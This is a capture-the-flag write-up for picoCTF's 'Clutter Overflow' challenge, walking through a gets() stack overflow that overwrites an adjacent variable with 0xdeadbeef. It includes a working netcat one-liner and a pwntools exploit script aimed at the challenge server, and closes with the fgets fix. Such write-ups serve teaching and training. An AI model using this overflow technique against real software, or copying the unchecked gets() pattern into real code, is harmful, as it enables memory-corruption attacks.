# Challenge Write-Up — Clutter Overflow

---

## 📌 Challenge Overview

| Field           | Information                                                                                     |
| :-------------- | :---------------------------------------------------------------------------------------------- |
| **Competition** | picoCTF                                                                                         |
| **Category**    | Binary Exploitation                                                                             |
| **Difficulty**  | Easy                                                                                            |
| **Objective**   | Overflow a buffer to overwrite a local variable called `code` with the value `0xdeadbeef` to get the flag |

---

## Initial Analysis

I was given a binary and its source code. Running the program shows some ASCII art and tells you two things: the current value of `code` is `0x0`, and it needs to be `0xdeadbeef` for the flag to print.

This is a variable overwrite challenge — similar in spirit to Local Target and Heap 0, but this time the target variable is 8 bytes wide and sitting on the stack right after a large buffer.

My plan:
- Read the source code to understand the memory layout
- Calculate how many bytes are needed to reach `code`
- Build a payload with that many filler bytes followed by `0xdeadbeef` in the right format
- Send it to the server

---

## 🔎 Step 1 — Read the Source Code

The source code showed two things sitting in memory next to each other:

```c
char clutter[0x100];  // 256 bytes
long code = 0;
```

User input was read into `clutter` using `gets()`:

```c
gets(clutter);
```

And the flag check was:

```c
if (code == 0xdeadbeef) {
    // print the flag
}
```

So `code` starts at `0` and we need to change it to `0xdeadbeef` by overflowing past `clutter`.

---

## Step 2 — Calculate the Padding

The `clutter` buffer is `0x100` bytes, which is **256 bytes** in decimal. The variable `code` is an 8-byte `long` that sits right after it in memory.

So the payload needs:
- 256 bytes to fill `clutter` completely
- 8 more bytes to fill any padding or alignment the compiler added between the two variables
- Then the value `0xdeadbeef`

In practice, the working offset turned out to be **264 bytes** of filler before the value. That is 256 for the buffer plus 8 for the gap between it and `code`.

---

## Step 3 — Handle Little-Endian

The number `0xdeadbeef` cannot just be typed as those exact bytes in that order. x86 systems store multi-byte values in **little-endian** format, meaning the least significant byte comes first.

So `0xdeadbeef` in little-endian is:

```
\xef\xbe\xad\xde
```

The bytes are reversed. This is what we write into the payload.

---

## Step 4 — Send the Payload

The quickest way to test was a one-liner piped directly into netcat:

```bash
(python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 264 + b"\xef\xbe\xad\xde\n")') | nc mars.picoctf.net 31890
```

That is 264 `A` characters to fill up to `code`, followed by `0xdeadbeef` written in little-endian order.

The same thing can be done with a proper `pwntools` script:

```python
from pwn import *

HOST = "mars.picoctf.net"
PORT = 31890

p = remote(HOST, PORT)

payload = b"A" * 264 + p64(0xdeadbeef)

p.sendline(payload)
print(p.recvall().decode())
```

`p64()` automatically handles the little-endian packing for a 64-bit value. Running this printed the flag. ✅

---

## 🏁 Flag

```
picoCTF{...clutter_overflow_flag...}
```

---

## 🔬 What Made This Work

The stack places local variables in memory one after another. `clutter` came first, then `code` came right after it. Since `gets()` wrote to `clutter` with no size limit, any input longer than 256 bytes spilled directly into `code`.

The little-endian detail is important: we could not just write `0xdeadbeef` as plain bytes in that order. We had to reverse them to match how x86 stores values. `pwntools`' `p64()` handles this automatically, which is one reason it is so useful for writing exploits.

Key differences from earlier challenges:
- Like Local Target, we are overwriting a variable rather than a return address
- Unlike Local Target, the target value here is 8 bytes wide (`long` on a 64-bit system), so `p64()` is used instead of `p32()`
- The offset math is straightforward: buffer size (256) plus compiler alignment padding (8) = 264

---

## 🎯 How to Solve Challenges Like This

1. Run the binary and note what value it tells you `code` currently is and what it needs to be
2. Read the source code to find the buffer size and the target variable
3. Add the buffer size plus any alignment padding to get the total filler length
4. Write the target value in little-endian byte order after the filler
5. Use `p64()` or `p32()` from pwntools to handle the byte order automatically
6. Send to the server and read the flag

---

## 🧩 Final Thoughts

Clutter Overflow is a clean and approachable variable overwrite challenge. The only new idea compared to Local Target is the little-endian byte ordering and the larger 8-byte target value. Once those two details click, the exploit builds itself.

The fix is identical to every other challenge in this series: replace `gets()` with `fgets(clutter, sizeof(clutter), stdin)`. That one change puts a hard ceiling on the input and prevents anything from reaching past the buffer into `code`.

---
